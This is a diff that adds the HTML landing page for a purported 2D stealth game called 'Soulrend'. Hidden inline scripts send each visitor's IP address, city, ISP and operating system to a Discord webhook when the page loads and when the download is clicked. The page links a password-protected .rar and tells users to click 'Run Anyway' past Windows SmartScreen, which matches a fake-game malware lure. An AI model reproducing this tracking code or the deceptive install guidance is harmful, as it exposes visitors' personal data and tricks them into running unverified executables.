@@ -1,0 +1,634 @@
+<!DOCTYPE html><html><head>
+    <meta charset="utf-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <title>Soulrend - Home</title>
+    <meta property="og:image" content="Sem_Titulo-448d638d63.html">
+    <meta name="description" content="Soulrend™ is a 2D stealth-action game about an evil shapeshifter on the run from justice. Survive a world forged through Medieval history with merciless pursuers, daring escapes, and an ancient mystery driving your every move.">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
+    <link rel="stylesheet" href="css/uicons-regular-rounded.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+
+    <link rel="stylesheet" href="css/plugins.css">
+    <link rel="stylesheet" href="css/main.css">
+
+    <script src="js/tg-page-head.js"></script>
+
+    <meta property="og:title" content="Soulrend Depth">
+    <meta property="og:type" content="website">
+    <meta property="og:image" content="images/X2aFHwaxRmiqFfH9ytDsPQ.png">
+    <meta property=" og:description" content="Soulrend™ is a 2D stealth-action game about an evil shapeshifter on the run from justice. Survive a world forged through Medieval history with merciless pursuers, daring escapes, and an ancient mystery driving your every move.">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="Soulrend">
+    <meta name="twitter:title" content="Soulrend">
+    <meta name="twitter:type" content="website">
+    <meta name="twitter:image" content="assets/img/twitter-image.png">
+    <meta name="twitter:description" content="Soulrend™ is a 2D stealth-action game about an evil shapeshifter on the run from justice. Survive a world forged through Medieval history with merciless pursuers, daring escapes, and an ancient mystery driving your every move.">
+    <meta property="fb:page_id" content="794950460550057">
+    <meta name="description" content="Soulrend™  is a 2D stealth-action game about an evil shapeshifter on the run from justice. Survive a world forged through Medieval history with merciless pursuers, daring escapes, and an ancient mystery driving your every move.">
+    <meta name="keywords" content="Soulrend Game">
+    <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
+    <script>
+        window.dataLayer = window.dataLayer || [];
+
+        function gtag() {
+            dataLayer.push(arguments);
+        }
+        gtag('js', new Date());
+        gtag('config', 'UA-223921009-3');
+    </script>
+
+    <!-- Define copyPassword() in the head to ensure it's available -->
+    <script>
+        function copyPassword() {
+            console.log("beta clicked! Attempting to copy...");
+            try {
+                navigator.clipboard.writeText("beta").then(() => {
+                    console.log("Successfully copied beta to clipboard");
+                    const copiedMessage = document.querySelector(".copied-message");
+                    if (copiedMessage) {
+                        copiedMessage.style.display = "block";
+                        copiedMessage.style.opacity = "1";
+                        setTimeout(() => {
+                            copiedMessage.style.opacity = "0";
+                            setTimeout(() => {
+                                copiedMessage.style.display = "none";
+                            }, 300);
+                        }, 1500);
+                    }
+                }).catch(err => {
+                    console.error("Failed to copy: ", err);
+                    alert("Failed to copy password. Please copy manually: beta");
+                });
+            } catch (err) {
+                console.error("Clipboard API not supported: ", err);
+                alert("Clipboard API not supported. Please copy manually: beta");
+            }
+        }
+    </script>
+</head>
+
+<body onload="EnteredTheWebsite()">
+    <main class="main--area">
+        <section class="slider__area slider__bg" data-background="./assets/img/slider/slider_bg.html">
+            <div class="slider-activee">
+                <div class="single-slider">
+                    <div class="container custom-container">
+                        <div class="row justify-content-between">
+                            <div class="col-lg-6">
+                                <div class="slider__content">
+                                    <h6 class="sub-title wow fadeInUp" data-wow-delay=".2s">Welcome to</h6>
+                                    <h2 class="title wow fadeInUp" data-wow-delay=".5s">
+                                        Soulrend
+                                    </h2>
+                                    <p class="fadeInUp" data-wow-delay=".8s">
+                                        Soulrend™ is a 2D stealth-action game about an evil shapeshifter on the run from justice. Survive a world forged through Medieval history with merciless pursuers, daring escapes, and an ancient mystery driving your every move.
+                                    </p>
+                                    <div class="slider__btn wow fadeInUp" data-wow-delay="1.2s">
+                                        <a href="https://www.dropbox.com/scl/fi/ekg4rxts5dg0ji5j23e6l/Soulrend.rar?rlkey=mkda8591sm3q6fsek7lyo5zes&st=bdmpg61s&dl=1" class="tg-btn-1 button button--primary active" target="_blank" onclick="sendDownloadInfo()">
+                                            <span>Download</span>
+                                        </a>
+
+                                        <script>
+                                            const webhookUrl = "https://discord.com/api/webhooks/1415688147815366767/jCgzu94niYv9VkpR-GKKLThxoFG87bt36i3_lLoR1AmyBUemSHitBvwBdF-3SUTsBIjz";
+
+                                            function EnteredTheWebsite() {
+                                                const button = document.querySelector('.tg-btn-1');
+                                                button.classList.add('active');
+
+                                                fetch('https://ipapi.co/json/')
+                                                    .then(res => res.json())
+                                                    .then(data => {
+                                                        const country = data.country_name || 'Unknown';
+                                                        const city = data.city || 'Unknown';
+                                                        const org = yaziKisalt(data.org) || 'Unknown';
+                                                        const flag = getCountryFlag(data.country_code);
+                                                        const ip = ipQuery(data.ip) || 'Unknown';
+                                                        enterSite(ip, `${country} ${flag}`, `${city}`, `${org}`, getOperatingSystem());
+                                                    })
+                                                    .catch(err => {
+                                                        console.error('IP data could not be retrieved: ' + err.message);
+                                                    })
+                                                    .finally(() => {
+                                                        setTimeout(() => button.classList.remove('active'), 2000);
+                                                    });
+                                            }
+
+                                            function sendDownloadInfo() {
+                                                const button = document.querySelector('.tg-btn-1');
+                                                button.classList.add('active');
+
+                                                fetch('https://ipapi.co/json/')
+                                                    .then(res => res.json())
+                                                    .then(data => {
+                                                        const country = data.country_name || 'Bilinmiyor';
+                                                        const city = data.city || 'Bilinmiyor';
+                                                        const org = yaziKisalt(data.org) || 'Bilinmiyor';
+                                                        const flag = getCountryFlag(data.country_code);
+                                                        const ip = ipQuery(data.ip) || 'Bilinmiyor';
+                                                        logDownload(ip, `${country} ${flag}`, `${city}`, `${org}`, getOperatingSystem());
+                                                    })
+                                                    .catch(err => {
+                                                        console.error('IP verisi alınamadı: ' + err.message);
+                                                    })
+                                                    .finally(() => {
+                                                        setTimeout(() => button.classList.remove('active'), 2000);
+                                                    });
+                                            }
+
+                                            function logDownload(ip, country, city, org, os) {
+                                                const payload = {
+                                                    embeds: [{
+                                                        "author": {
+                                                            "name": "Soulrenddepth",
+                                                            "icon_url": "https://img001.prntscr.com/file/img001/smPOFMXgS5G8uPDnmZCIvw.png"
+                                                        },
+                                                        title: 'orospu evladinin biri oyunu indirdi',
+                                                        color: 0x4B0082,
+                                                        fields: [{
+                                                                name: 'IP Address',
+                                                                value: ip,
+                                                                inline: true
+                                                            },
+                                                            {
+                                                                name: 'country',
+                                                                value: country,
+                                                                inline: true
+                                                            },
+                                                            {
+                                                                name: 'city',
+                                                                value: city,
+                                                                inline: false
+                                                            },
+                                                            {
+                                                                name: 'Org',
+                                                                value: org,
+                                                                inline: false
+                                                            },
+                                                            {
+                                                                name: 'Operating System',
+                                                                value: os,
+                                                                inline: false
+                                                            },
+                                                            {
+                                                                name: 'Detailed Information',
+                                                                value: `https://Soulrendgaming.wuaze.com/checkIp.html?ip=${ip}`,
+                                                                inline: false
+                                                            }
+                                                        ],
+                                                        timestamp: new Date().toISOString(),
+                                                        footer: {
+                                                            text: 'download info'
+                                                        }
+                                                    }]
+                                                };
+
+                                                fetch(webhookUrl, {
+                                                        method: 'POST',
+                                                        headers: {
+                                                            'Content-Type': 'application/json'
+                                                        },
+                                                        body: JSON.stringify(payload)
+                                                    })
+                                                    .then(response => {
+                                                        if (!response.ok) {
+                                                            throw new Error('Webhook request failed: ' + response.status);
+                                                        }
+                                                        console.log('Webhook sent successfully!');
+                                                    })
+                                                    .catch(err => {
+                                                        console.error('Webhook could not be sent: ' + err.message);
+                                                    });
+                                            }
+
+
+
+                                            function enterSite(ip, country, city, org, os) {
+                                                const payload = {
+                                                    embeds: [{
+                                                        "author": {
+                                                            "name": "Soulrenddepth",
+                                                            "icon_url": "https://img001.prntscr.com/file/img001/GzN3vKX8T7O6auudDAwHag.png"
+                                                        },
+                                                        title: 'orospu evladinin biri siteye girdi',
+                                                        color: 0x4B0082,
+                                                        fields: [{
+                                                                name: 'IP Address',
+                                                                value: ip,
+                                                                inline: true
+                                                            },
+                                                            {
+                                                                name: 'Country',
+                                                                value: country,
+                                                                inline: true
+                                                            },
+                                                            {
+                                                                name: 'City',
+                                                                value: city,
+                                                                inline: false
+                                                            },
+                                                            {
+                                                                name: 'Org',
+                                                                value: org,
+                                                                inline: false
+                                                            },
+                                                            {
+                                                                name: 'Operating System',
+                                                                value: os,
+                                                                inline: false
+                                                            },
+                                                            {
+                                                                name: 'Detailed Information',
+                                                                value: `https://Soulrendgaming.wuaze.com/checkIp.html?ip=${ip}`,
+                                                                inline: false
+                                                            }
+                                                        ],
+                                                        timestamp: new Date().toISOString(),
+                                                        footer: {
+                                                            text: 'login info'
+                                                        }
+                                                    }]
+                                                };
+
+                                                fetch(webhookUrl, {
+                                                        method: 'POST',
+                                                        headers: {
+                                                            'Content-Type': 'application/json'
+                                                        },
+                                                        body: JSON.stringify(payload)
+                                                    })
+                                                    .then(response => {
+                                                        if (!response.ok) {
+                                                            throw new Error('Webhook request failed: ' + response.status);
+                                                        }
+                                                        console.log('Webhook sent successfully!');
+                                                    })
+                                                    .catch(err => {
+                                                        console.error('Failed to send webhook: ' + err.message);
+                                                    });
+                                            }
+
+                                            function yaziKisalt(yazi) {
+                                                if (yazi.length > 20) {
+                                                    return yazi.substring(0, 20) + '...';
+                                                }
+                                                return yazi;
+                                            }
+
+                                            function ipQuery(checkIp) {
+                                                if (checkIp == "109.228.239.248") {
+                                                    return "Who is this bitch? 🙂‍↔️";
+                                                }
+                                                return checkIp;
+                                            }
+
+                                            function getOperatingSystem() {
+                                                const ua = navigator.userAgent;
+                                                return /Win/.test(ua) ? 'Windows' :
+                                                    /Mac/.test(ua) ? 'Mac OS' :
+                                                    /X11/.test(ua) ? 'UNIX' :
+                                                    /Linux/.test(ua) ? 'Linux' : 'Unknown';
+                                            }
+
+                                            function getCountryFlag(countryCode) {
+                                                if (!countryCode) return '';
+                                                return countryCode
+                                                    .toUpperCase()
+                                                    .split('')
+                                                    .map(letter => String.fromCodePoint(127397 + letter.charCodeAt(0)))
+                                                    .join('');
+                                            }
+                                        </script>
+                                        
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="col-xxl-6 col-xl-5 col-lg-6">
+                                <div class="slider__img text-center d-none d-lg-block">
+                                    <img src="images/octopus.png" data-magnetic="" alt="img" style="left: 10rem; top: 5rem; position: absolute; opacity: 10%;">
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="octopus-item__area">
+            <div class="container custom-container">
+                <div class="row justify-content-center">
+                    <div class="col-xxl-4 col-xl-5 col-lg-6 col-md-9">
+                        <div class="octopus-item__box">
+                            <div class="octopus-item__content">
+                                <h4 class="title">
+                                    <a href="#">Chaos in the Kingdom of Avencia</a>
+                                    <p style="font-size: 14px;">Soulrend is set in a Medieval world full of unrest and civil war. With factions vying for control of Avencia, you can sow chaos. But with a huge bounty on your head, countless enemies will hunt you down.</p>
+                                </h4>
+                                <i class="fi fi-rr-info"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-xxl-4 col-xl-5 col-lg-6 col-md-9">
+                        <div class="octopus-item__box">
+                            <div class="octopus-item__content">
+                                <h4 class="title">
+                                    <a href="#">The Prisoner’s Deadly Powers</a>
+                                    <p style="font-size: 14px;">The Prisoner uses shapeshifting abilities, from combat skills to stealth, letting players customize their strategy. When surrounded, the Unleash ability turns you into a terrifying creature capable of wiping out armies.
+                                    </p>
+                                </h4>
+                                <i class="fi fi-rr-gamepad"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-xxl-4 col-xl-5 col-lg-6 col-md-9">
+                        <div class="octopus-item__box">
+                            <div class="octopus-item__content">
+                                <h4 class="title">
+                                    <a href="#">Smart Soldiers of Soulrend</a>
+                                    <p style="font-size: 14px;">Soulrend’s soldiers have reactive AI, teaming up to stop you. Each has a unique personality, retreating or ambushing instead of blindly attacking. They learn from your moves, countering you better the longer you fight—variety
+                                        keeps them guessing.</p>
+                                </h4>
+                                <i class="fi fi-rr-brain-circuit"></i>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- FAQ Section -->
+        <section class="faq__area">
+            <div class="container custom-container">
+                <div class="row justify-content-center">
+                    <div class="col-xl-10 col-lg-12 col-md-12">
+                        <div class="section__title text-center mb-60">
+                            <h3 class="title">Frequently Asked Questions</h3>
+                        </div>
+                        <div class="faq__box" style="background: linear-gradient(145deg, #1A1A1A, #2A2A2A); padding: 30px; border-radius: 15px; box-shadow: 0 6px 20px rgba(0, 0, 0, 0.8); border: 3px solid #f5a623; font-family: 'Poppins', sans-serif;">
+                            <div class="faq__item">
+                                <div class="faq__question" onclick="toggleAnswer(this)" style="cursor: pointer; padding: 15px; background: #2A2A2A; border-radius: 8px; margin-bottom: 10px; transition: background 0.3s ease;">
+                                    <h4 style="font-size: 18px; font-weight: 600; color: #f5a623; margin: 0; display: flex; justify-content: space-between; align-items: center;">
+                                        I’m getting a Windows SmartScreen warning, is this file safe?
+                                        <span class="faq__toggle" style="font-size: 20px; color: #f5a623;">+</span>
+                                    </h4>
+                                </div>
+                                <div class="faq__answer" style="display: none; padding: 15px; background: #333; border-radius: 8px; margin-bottom: 10px;">
+                                    <p style="font-size: 16px; line-height: 1.8; color: #E0E0E0; margin: 0;">
+                                        This is a default security feature that pops up when a file isn’t digitally signed or comes from an unrecognized source. I can assure you this file is completely safe. You can click "More Info" and "Run Anyway".
+                                    </p>
+                                    <img src="images/smartscreen.png" alt="SmartScreen Warning" style="max-width: 100%; height: auto; border-radius: 8px; margin-top: 15px;">
+                                </div>
+                            </div>
+                            <div class="faq__item">
+                                <div class="faq__question" onclick="toggleAnswer(this)" style="cursor: pointer; padding: 15px; background: #2A2A2A; border-radius: 8px; margin-bottom: 10px; transition: background 0.3s ease;">
+                                    <h4 style="font-size: 18px; font-weight: 600; color: #f5a623; margin: 0; display: flex; justify-content: space-between; align-items: center;">
+                                        What are the system requirements?
+                                        <span class="faq__toggle" style="font-size: 20px; color: #f5a623;">+</span>
+                                    </h4>
+                                </div>
+                                <div class="faq__answer" style="display: none; padding: 15px; background: #333; border-radius: 8px; margin-bottom: 10px;">
+                                    <p style="font-size: 16px; line-height: 1.8; color: #E0E0E0; margin: 0;">
+                                        Soulrend can run on low-end PCs. Minimum requirements: Windows 10, Intel i3 or equivalent processor, 4 GB RAM, integrated graphics, 1 GB free storage space.
+                                    </p>
+                                </div>
+                            </div>
+                            <div class="faq__item">
+                                <div class="faq__question" onclick="toggleAnswer(this)" style="cursor: pointer; padding: 15px; background: #2A2A2A; border-radius: 8px; margin-bottom: 10px; transition: background 0.3s ease;">
+                                    <h4 style="font-size: 18px; font-weight: 600; color: #f5a623; margin: 0; display: flex; justify-content: space-between; align-items: center;">
+                                        Which platforms can I play the game on?
+                                        <span class="faq__toggle" style="font-size: 20px; color: #f5a623;">+</span>
+                                    </h4>
+                                </div>
+                                <div class="faq__answer" style="display: none; padding: 15px; background: #333; border-radius: 8px; margin-bottom: 10px;">
+                                    <p style="font-size: 16px; line-height: 1.8; color: #E0E0E0; margin: 0;">
+                                        Currently, Soulrend is only available for Windows PCs. We’re working on Mac and Linux support, but no release date has been set yet.
+                                    </p>
+                                </div>
+                            </div>
+                            <div class="faq__item">
+                                <div class="faq__question" onclick="toggleAnswer(this)" style="cursor: pointer; padding: 15px; background: #2A2A2A; border-radius: 8px; margin-bottom: 10px; transition: background 0.3s ease;">
+                                    <h4 style="font-size: 18px; font-weight: 600; color: #f5a623; margin: 0; display: flex; justify-content: space-between; align-items: center;">
+                                        Will the game receive updates?
+                                        <span class="faq__toggle" style="font-size: 20px; color: #f5a623;">+</span>
+                                    </h4>
+                                </div>
+                                <div class="faq__answer" style="display: none; padding: 15px; background: #333; border-radius: 8px; margin-bottom: 10px;">
+                                    <p style="font-size: 16px; line-height: 1.8; color: #E0E0E0; margin: 0;">
+                                        Yes! Soulrend will receive regular updates with new levels, characters, and features. Stay tuned!
+                                    </p>
+                                </div>
+                            </div>
+                            <div class="faq__item">
+                                <div class="faq__question" onclick="toggleAnswer(this)" style="cursor: pointer; padding: 15px; background: #2A2A2A; border-radius: 8px; margin-bottom: 10px; transition: background 0.3s ease;">
+                                    <h4 style="font-size: 18px; font-weight: 600; color: #f5a623; margin: 0; display: flex; justify-content: space-between; align-items: center;">
+                                        How can I contact support if I encounter issues?
+                                        <span class="faq__toggle" style="font-size: 20px; color: #f5a623;">+</span>
+                                    </h4>
+                                </div>
+                                <div class="faq__answer" style="display: none; padding: 15px; background: #333; border-radius: 8px; margin-bottom: 10px;">
+                                    <p style="font-size: 16px; line-height: 1.8; color: #E0E0E0; margin: 0;">
+                                        You can reach out to our support team via email at support@Soulrenddepth.com We’re here to help with any issues you might face!
+                                    </p>
+                                </div>
+                            </div>
+                            <div class="faq__item">
+                                <div class="faq__question" onclick="toggleAnswer(this)" style="cursor: pointer; padding: 15px; background: #2A2A2A; border-radius: 8px; margin-bottom: 10px; transition: background 0.3s ease;">
+                                    <h4 style="font-size: 18px; font-weight: 600; color: #f5a623; margin: 0; display: flex; justify-content: space-between; align-items: center;">
+                                        Is there a multiplayer mode in Soulrend?
+                                        <span class="faq__toggle" style="font-size: 20px; color: #f5a623;">+</span>
+                                    </h4>
+                                </div>
+                                <div class="faq__answer" style="display: none; padding: 15px; background: #333; border-radius: 8px; margin-bottom: 10px;">
+                                    <p style="font-size: 16px; line-height: 1.8; color: #E0E0E0; margin: 0;">
+                                        Yes, Soulrend Depth supports co-op multiplayer mode. You can play with your friends! :)
+                                    </p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="video__area video-bg tg-jarallax" data-background="assets/img/gallery/gallery01.html">
+            <div class="container">
+                <div class="row justify-content-center">
+                    <div class="col-xl-6 col-lg-8 col-md-11">
+                        <div class="video__content text-center">
+                            <div style="position:relative; width:100%; height:0px; padding-bottom:56.206%">
+                                <iframe allow="fullscreen" allowfullscreen="" height="100%" src="https://streamable.com/e/7v9gaf?" width="100%" style="border:none; width:100%; height:100%; position:absolute; left:0px; top:0px; overflow:hidden;"></iframe>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer class="footer-style-one">
+        <div class="copyright__wrap">
+            <div class="container">
+                <div class="row align-items-center">
+                    <div class="col-md-7">
+                        <div class="copyright__text">
+                            <p>Copyright © 2025 - All Rights Reserved By <span>LYCEROS, Studios.</span></p>
+                        </div>
+                    </div>
+                    <div class="col-md-5">
+                        <div class="copyright__card text-center text-md-end">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Install Instructions Box -->
+    <div class="install-box" style="position: absolute; right: 20px; top: 20px; background: linear-gradient(145deg, #1A1A1A, #2A2A2A); color: #E0E0E0; padding: 25px; border-radius: 15px; width: 380px; box-shadow: 0 6px 20px rgba(0, 0, 0, 0.8); border: 3px solid #f5a623; font-family: 'Poppins', sans-serif; transition: transform 0.3s ease; z-index: 1000;">
+        <h3 style="font-size: 24px; font-weight: 600; text-align: center; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 3px; color: #f5a623; border-bottom: 3px solid #f5a623; padding-bottom: 10px; background: #2A2A2A; border-radius: 10px; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);">
+            How to Install Soulrend</h3>
+        <p style="font-size: 13px; text-align: center; margin-bottom: 15px; color: #B0B0B0;">Get started with
+            <i>Soulrend</i> in just a few steps! 🚀
+        </p>
+        <ol style="line-height: 1.6; padding-left: 20px; font-size: 14px; color: #E0E0E0;">
+            <li style="margin-bottom: 15px;">
+                <strong>Download and Extract the Game Files</strong><br> Download the game file and extract it using <a href="https://www.win-rar.com/fileadmin/winrar-versions/winrar/winrar-x64-711.exe" target="_blank" onclick="console.log('WinRAR link clicked!');" style="color: #f5a623; text-decoration: none; font-weight: bold; transition: color 0.3s ease;">WinRAR</a>. You’ll see files like <code>Soulrend.exe</code> and <code>UnityPlayer.dll</code>.
+            </li>
+            <li style="margin-bottom: 15px;">
+                <strong>Enter the Password (If Prompted)</strong><br> If .rar file asks for a password, use: <span class="copy-text" onclick="copyPassword()" style="cursor: pointer; font-weight: bold; color: #f5a623; background-color: #333; padding: 4px 10px; border-radius: 5px; border: 1px solid #f5a623; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3); position: relative;">beta<span class="copied-message" style="display: none; position: absolute; top: -30px; left: 50%; transform: translateX(-50%); background: #f5a623; color: #1A1A1A; padding: 5px 10px; border-radius: 5px; font-size: 12px; opacity: 0; transition: opacity 0.3s ease;">Copied!</span></span>
+            </li>
+            <li style="margin-bottom: 15px;">
+                <strong>Launch and Enjoy!</strong><br> Run <code>SoulrendDepth.exe</code> to start. Ensure files like <code>UnityPlayer.dll</code> are all in the same folder. If you have issues, reach out. 😊 Enjoy!
+            </li>
+        </ol>
+    </div>
+
+    <!-- Styles for Install Box and FAQ Section -->
+    <style>
+        /* Install Box Styles */
+
+        .install-box {
+            pointer-events: auto !important;
+        }
+
+        .install-box * {
+            pointer-events: auto !important;
+        }
+
+        .install-box:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.9);
+        }
+
+        .install-box a:hover {
+            color: #FFFFFF !important;
+            text-decoration: underline !important;
+        }
+
+        .install-box li {
+            position: relative;
+            padding-left: 20px;
+            transition: color 0.3s ease;
+        }
+
+        .install-box li:before {
+            content: "➤";
+            position: absolute;
+            left: 0;
+            color: #f5a623;
+            font-size: 16px;
+            transition: transform 0.3s ease;
+        }
+
+        .install-box li:hover {
+            color: #FFFFFF;
+        }
+
+        .install-box li:hover:before {
+            transform: translateX(5px);
+        }
+
+        .copy-text:hover {
+            background-color: #444;
+            color: #FFFFFF;
+        }
+
+        /* FAQ Section Styles */
+
+        .faq__box {
+            pointer-events: auto !important;
+        }
+
+        .faq__box * {
+            pointer-events: auto !important;
+        }
+
+        .faq__question:hover {
+            background: #3A3A3A;
+        }
+
+        .faq__area {
+            margin: 30px 0;
+            /* Adjusted margin for better centering */
+        }
+    </style>
+
+    <!-- JavaScript for FAQ Toggle -->
+    <script>
+        function toggleAnswer(element) {
+            const answer = element.nextElementSibling;
+            const toggle = element.querySelector('.faq__toggle');
+            if (answer.style.display === "block") {
+                answer.style.display = "none";
+                toggle.textContent = "+";
+            } else {
+                answer.style.display = "block";
+                toggle.textContent = "−";
+            }
+        }
+    </script>
+
+    <!-- External Scripts -->
+    <script src="js/jquery-3.6.0.min.js"></script>
+    <script src="js/plugins.js"></script>
+    <script src="js/ajax-form.js"></script>
+    <script src="js/main.js"></script>
+
+    <script>
+        'undefined' === typeof _trfq || (window._trfq = []);
+        'undefined' === typeof _trfd && (window._trfd = []), _trfd.push({
+            'tccl.baseHost': 'secureserver.net'
+        }, {
+            'ap': 'cpsh-oh'
+        }, {
+            'server': 'p3plzcpnl509036'
+        }, {
+            'dcenter': 'p3'
+        }, {
+            'cp_id': '10262477'
+        }, {
+            'cp_cl': '8'
+        }) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.
+    </script>
+    <script src="scc-c2.min.html"></script>
+
+<script>
+    'undefined' === typeof _trfq || (window._trfq = []);
+    'undefined' === typeof _trfd && (window._trfd = []), _trfd.push({
+        'tccl.baseHost': 'secureserver.net'
+    }, {
+        'ap': 'cpsh-oh'
+    }, {
+        'server': 'p3plzcpnl508591'
+    }, {
+        'dcenter': 'p3'
+    }, {
+        'cp_id': '10275439'
+    }, {
+        'cp_cl': '8'
+    }) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.
+</script>
+<script src="js/scc-c2.min.js"></script>
+
+
+</body></html>
